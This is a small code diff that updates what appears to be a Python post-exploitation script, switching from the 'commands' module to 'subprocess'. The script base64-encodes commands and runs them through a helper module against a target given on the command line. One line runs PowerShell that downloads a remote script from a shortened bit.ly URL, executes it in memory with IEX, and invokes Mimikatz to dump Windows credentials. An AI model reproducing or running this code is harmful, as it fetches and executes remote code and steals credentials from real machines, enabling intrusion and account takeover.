@@ -1,4 +1,4 @@
-import commands, base64
+import base64
 import re, sys
 import subprocess
 
@@ -17,7 +17,7 @@ def customBase64(encodedTxt, decode=1):
 
 
 
-exeCMD = lambda cmd : commands.getoutput("python modules/runCMD.py {} {} {}".format(customBase64(cmd, -1), sys.argv[1], sys.argv[2])).replace('\n', '')
+exeCMD = lambda cmd : subprocess.getoutput("python modules/runCMD.py {} {} {}".format(customBase64(cmd, -1), sys.argv[1], sys.argv[2])).replace('\n', '')
 
 
 dump_cred = exeCMD('powershell -C "IEX (New-Object Net.WebClient).DownloadString(\'http://bit.ly/1qMn59d\'); Invoke-Mimikatz -DumpCreds"')
